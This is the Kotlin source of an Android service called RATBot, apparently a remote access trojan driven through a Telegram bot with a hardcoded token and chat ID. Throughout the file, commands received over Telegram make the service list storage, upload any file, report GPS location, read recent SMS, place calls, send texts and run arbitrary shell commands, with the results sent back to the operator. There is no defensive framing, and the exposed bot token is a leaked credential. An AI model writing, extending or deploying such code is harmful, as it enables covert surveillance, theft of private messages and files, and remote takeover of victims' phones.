package com.example.ratbot

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.Location
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.provider.Settings
import android.telephony.SmsManager
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import okhttp3.*
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class TelegramBotService : Service() {

    private val TOKEN = "8577004305:AAGEQsoka010Y-ovi90uSloZ0RQgHn8EQjw"
    private val CHAT_ID_ALLOWED = "8610981973"

    private var lastUpdateId = 0
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private lateinit var fusedLocationClient: FusedLocationProviderClient

    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        val notification = NotificationCompat.Builder(this, "rat_channel")
            .setContentTitle("RAT Service")
            .setContentText("الخدمة تعمل الآن")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(1, notification)
        }

        Thread { pollUpdates() }.start()
        return START_STICKY
    }

    private fun pollUpdates() {
        while (true) {
            try {
                val url = "https://api.telegram.org/bot$TOKEN/getUpdates?offset=$lastUpdateId&timeout=30"
                val request = Request.Builder().url(url).build()
                val response = client.newCall(request).execute()
                val body = response.body?.string()
                
                if (body != null) {
                    val json = JSONObject(body)
                    if (json.getBoolean("ok")) {
                        val updates = json.getJSONArray("result")
                        for (i in 0 until updates.length()) {
                            val update = updates.getJSONObject(i)
                            lastUpdateId = update.getInt("update_id") + 1
                            val message = update.optJSONObject("message")
                            if (message != null) {
                                val chatId = message.getJSONObject("chat").get("id").toString()
                                val text = message.optString("text")
                                if (chatId == CHAT_ID_ALLOWED || CHAT_ID_ALLOWED == "YOUR_CHAT_ID_HERE") {
                                    handleCommand(chatId, text)
                                }
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            Thread.sleep(2000)
        }
    }

    private fun handleCommand(chatId: String, cmd: String) {
        when {
            cmd == "/start" -> {
                sendMessage(chatId, "✅ RATBot Active\nCommands:\n/storage [path]\n/upload [file_path]\n/location\n/sms\n/call [number]\n/sendsms [number] [text]\n/shell [command]")
            }
            cmd.startsWith("/storage") -> {
                val path = cmd.removePrefix("/storage").trim()
                val dir = if (path.isEmpty()) Environment.getExternalStorageDirectory().absolutePath else path
                val file = File(dir)
                if (file.exists() && file.isDirectory) {
                    val files = file.listFiles()?.joinToString("\n") { (if (it.isDirectory) "📁 " else "📄 ") + it.name } ?: "فارغ"
                    sendMessage(chatId, "محتويات $dir:\n${files.take(4000)}")
                } else {
                    sendMessage(chatId, "المسار غير موجود")
                }
            }
            cmd.startsWith("/upload") -> {
                val filePath = cmd.removePrefix("/upload").trim()
                val file = File(filePath)
                if (file.exists() && file.isFile) {
                    sendDocument(chatId, file)
                } else {
                    sendMessage(chatId, "الملف غير موجود")
                }
            }
            cmd == "/location" -> {
                if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    fusedLocationClient.lastLocation.addOnSuccessListener { loc ->
                        if (loc != null) {
                            sendMessage(chatId, "📍 Location: https://www.google.com/maps?q=${loc.latitude},${loc.longitude}")
                        } else {
                            sendMessage(chatId, "تعذر جلب الموقع")
                        }
                    }
                } else {
                    sendMessage(chatId, "لا توجد صلاحية الموقع")
                }
            }
            cmd == "/sms" -> {
                getSms(chatId)
            }
            cmd.startsWith("/call") -> {
                val number = cmd.removePrefix("/call").trim()
                if (number.isNotEmpty()) makeCall(number)
            }
            cmd.startsWith("/sendsms") -> {
                val parts = cmd.removePrefix("/sendsms").trim().split(" ", limit = 2)
                if (parts.size == 2) sendSms(parts[0], parts[1])
            }
            cmd.startsWith("/shell") -> {
                val shellCmd = cmd.removePrefix("/shell").trim()
                val result = runShell(shellCmd)
                sendMessage(chatId, "Output:\n$result")
            }
        }
    }

    private fun sendMessage(chatId: String, text: String) {
        val url = "https://api.telegram.org/bot$TOKEN/sendMessage"
        val body = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", text)
            .build()
        val request = Request.Builder().url(url).post(body).build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }

    private fun sendDocument(chatId: String, file: File) {
        val url = "https://api.telegram.org/bot$TOKEN/sendDocument"
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("document", file.name, RequestBody.create(MediaType.parse("application/octet-stream"), file))
            .build()
        val request = Request.Builder().url(url).post(body).build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }

    private fun getSms(chatId: String) {
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return
        val cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10")
        val sb = StringBuilder()
        while (cursor?.moveToNext() == true) {
            val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
            val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
            sb.append("From: $address\n$body\n---\n")
        }
        cursor?.close()
        sendMessage(chatId, if (sb.isEmpty()) "No SMS found" else sb.toString())
    }

    private fun makeCall(number: String) {
        if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) return
        val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number"))
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    private fun sendSms(number: String, text: String) {
        try {
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                getSystemService(SmsManager::class.java)
            } else {
                SmsManager.getDefault()
            }
            smsManager.sendTextMessage(number, null, text, null, null)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun runShell(command: String): String {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            process.inputStream.bufferedReader().readText()
        } catch (e: Exception) {
            e.message ?: "Error"
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("rat_channel", "RAT Service", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
